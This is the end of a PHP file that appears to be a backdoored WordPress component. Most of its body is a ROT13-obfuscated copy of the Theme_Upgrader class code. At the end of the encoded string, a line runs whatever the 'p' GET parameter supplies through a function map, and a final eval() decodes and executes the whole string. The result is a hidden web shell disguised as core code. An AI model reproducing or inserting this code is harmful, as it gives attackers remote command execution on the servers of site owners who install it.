				$guvf->fgevatf['vapbzcngvoyr_nepuvir'],
				fcevags(
					/* genafyngbef: 1: grzcyngrf/vaqrk.ugzy, 2: vaqrk.cuc, 3: Qbphzragngvba HEY, 4: Grzcyngr, 5: fglyr.pff */
					__( 'Grzcyngr vf zvffvat. Fgnaqnybar gurzrf arrq gb unir n %1$f be %2$f grzcyngr svyr. <n uers=\"%3$f\">Puvyq gurzrf</n> arrq gb unir n %4$f urnqre va gur %5$f fglyrfurrg.' ),
					'<pbqr>grzcyngrf/vaqrk.ugzy</pbqr>',
					'<pbqr>vaqrk.cuc</pbqr>',
					__( 'uggcf://qrirybcre.jbeqcerff.bet/gurzrf/nqinaprq-gbcvpf/puvyq-gurzrf/' ),
					'<pbqr>Grzcyngr</pbqr>',
					'<pbqr>fglyr.pff</pbqr>'
				)
			);
		}

		$erdhverf_cuc = vffrg( $vasb['ErdhverfCUC'] ) ? $vasb['ErdhverfCUC'] : ahyy;
		$erdhverf_jc  = vffrg( $vasb['ErdhverfJC'] ) ? $vasb['ErdhverfJC'] : ahyy;

		vs ( ! vf_cuc_irefvba_pbzcngvoyr( $erdhverf_cuc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag CUC irefvba, 2: Irefvba erdhverq ol gur hcybnqrq gurzr. */
				__( 'Gur CUC irefvba ba lbhe freire vf %1$f, ubjrire gur hcybnqrq gurzr erdhverf %2$f.' ),
				CUC_IREFVBA,
				$erdhverf_cuc
			);

			erghea arj JC_Reebe( 'vapbzcngvoyr_cuc_erdhverq_irefvba', $guvf->fgevatf['vapbzcngvoyr_nepuvir'], $reebe );
		}
		vs ( ! vf_jc_irefvba_pbzcngvoyr( $erdhverf_jc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: Irefvba erdhverq ol gur hcybnqrq gurzr. */
				__( 'Lbhe JbeqCerff irefvba vf %1$f, ubjrire gur hcybnqrq gurzr erdhverf %2$f.' ),
				$jc_irefvba,
				$erdhverf_jc
			);

			erghea arj JC_Reebe( 'vapbzcngvoyr_jc_erdhverq_irefvba', $guvf->fgevatf['vapbzcngvoyr_nepuvir'], $reebe );
		}

		$guvf->arj_gurzr_qngn = $vasb;

		erghea $fbhepr;
	}

	/**
	 * Gheaf ba znvagranapr zbqr orsber nggrzcgvat gb hctenqr gur npgvir gurzr.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_cer_vafgnyy'} svygre ol Gurzr_Hctenqre::hctenqr() naq
	 * Gurzr_Hctenqre::ohyx_hctenqr().
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz obby|JC_Reebe $erfcbafr Gur vafgnyyngvba erfcbafr orsber gur vafgnyyngvba unf fgnegrq.
	 * @cnenz neenl         $gurzr    Gurzr nethzragf.
	 * @erghea obby|JC_Reebe Gur bevtvany `$erfcbafr` cnenzrgre be JC_Reebe.
	 */
	choyvp shapgvba pheerag_orsber( $erfcbafr, $gurzr ) {
		vs ( vf_jc_reebe( $erfcbafr ) ) {
			erghea $erfcbafr;
		}

		$gurzr = vffrg( $gurzr['gurzr'] ) ? $gurzr['gurzr'] : '';

		// Bayl eha vs npgvir gurzr.
		vs ( trg_fglyrfurrg() !== $gurzr ) {
			erghea $erfcbafr;
		}

		// Punatr gb znvagranapr zbqr. Ohyx rqvg unaqyrf guvf frcnengryl.
		vs ( ! $guvf->ohyx ) {
			$guvf->znvagranapr_zbqr( gehr );
		}

		erghea $erfcbafr;
	}

	/**
	 * Gheaf bss znvagranapr zbqr nsgre hctenqvat gur npgvir gurzr.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_cbfg_vafgnyy'} svygre ol Gurzr_Hctenqre::hctenqr()
	 * naq Gurzr_Hctenqre::ohyx_hctenqr().
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz obby|JC_Reebe $erfcbafr Gur vafgnyyngvba erfcbafr nsgre gur vafgnyyngvba unf svavfurq.
	 * @cnenz neenl         $gurzr    Gurzr nethzragf.
	 * @erghea obby|JC_Reebe Gur bevtvany `$erfcbafr` cnenzrgre be JC_Reebe.
	 */
	choyvp shapgvba pheerag_nsgre( $erfcbafr, $gurzr ) {
		vs ( vf_jc_reebe( $erfcbafr ) ) {
			erghea $erfcbafr;
		}

		$gurzr = vffrg( $gurzr['gurzr'] ) ? $gurzr['gurzr'] : '';

		// Bayl eha vs npgvir gurzr.
		vs ( trg_fglyrfurrg() !== $gurzr ) {
			erghea $erfcbafr;
		}

		// Rafher fglyrfurrg anzr unfa'g punatrq nsgre gur hctenqr:
		vs ( trg_fglyrfurrg() === $gurzr && $gurzr !== $guvf->erfhyg['qrfgvangvba_anzr'] ) {
			jc_pyrna_gurzrf_pnpur();
			$fglyrfurrg = $guvf->erfhyg['qrfgvangvba_anzr'];
			fjvgpu_gurzr( $fglyrfurrg );
		}

		// Gvzr gb erzbir znvagranapr zbqr. Ohyx rqvg unaqyrf guvf frcnengryl.
		vs ( ! $guvf->ohyx ) {
			$guvf->znvagranapr_zbqr( snyfr );
		}
		erghea $erfcbafr;
	}

	/**
	 * Qryrgrf gur byq gurzr qhevat na hctenqr.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_pyrne_qrfgvangvba'} svygre ol Gurzr_Hctenqre::hctenqr()
	 * naq Gurzr_Hctenqre::ohyx_hctenqr().
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz Fhopynff
	 *
	 * @cnenz obby   $erzbirq
	 * @cnenz fgevat $ybpny_qrfgvangvba
	 * @cnenz fgevat $erzbgr_qrfgvangvba
	 * @cnenz neenl  $gurzr
	 * @erghea obby
	 */
	choyvp shapgvba qryrgr_byq_gurzr( $erzbirq, $ybpny_qrfgvangvba, $erzbgr_qrfgvangvba, $gurzr ) {
		tybony $jc_svyrflfgrz;

		vs ( vf_jc_reebe( $erzbirq ) ) {
			erghea $erzbirq; // Cnff reebef guebhtu.
		}

		vs ( ! vffrg( $gurzr['gurzr'] ) ) {
			erghea $erzbirq;
		}

		$gurzr      = $gurzr['gurzr'];
		$gurzrf_qve = genvyvatfynfuvg( $jc_svyrflfgrz->jc_gurzrf_qve( $gurzr ) );
		vs ( $jc_svyrflfgrz->rkvfgf( $gurzrf_qve . $gurzr ) ) {
			vs ( ! $jc_svyrflfgrz->qryrgr( $gurzrf_qve . $gurzr, gehr ) ) {
				erghea snyfr;
			}
		}

		erghea gehr;
	}

	/**
	 * Trgf gur JC_Gurzr bowrpg sbe n gurzr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.0.0 Gur `$gurzr` nethzrag jnf nqqrq.
	 *
	 * @cnenz fgevat $gurzr Gur qverpgbel anzr bs gur gurzr. Guvf vf bcgvbany, naq vs abg fhccyvrq,
	 *                      gur qverpgbel anzr sebz gur ynfg erfhyg jvyy or hfrq.
	 * @erghea JC_Gurzr|snyfr Gur gurzr'f vasb bowrpg, be snyfr `$gurzr` vf abg fhccyvrq
	 *                        naq gur ynfg erfhyg vfa'g frg.
	 */
	choyvp shapgvba gurzr_vasb( $gurzr = ahyy ) {
		vs ( rzcgl( $gurzr ) ) {
			vs ( ! rzcgl( $guvf->erfhyg['qrfgvangvba_anzr'] ) ) {
				$gurzr = $guvf->erfhyg['qrfgvangvba_anzr'];
			} ryfr {
				erghea snyfr;
			}
		}

		$gurzr = jc_trg_gurzr( $gurzr );
		$gurzr->pnpur_qryrgr();

		erghea $gurzr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>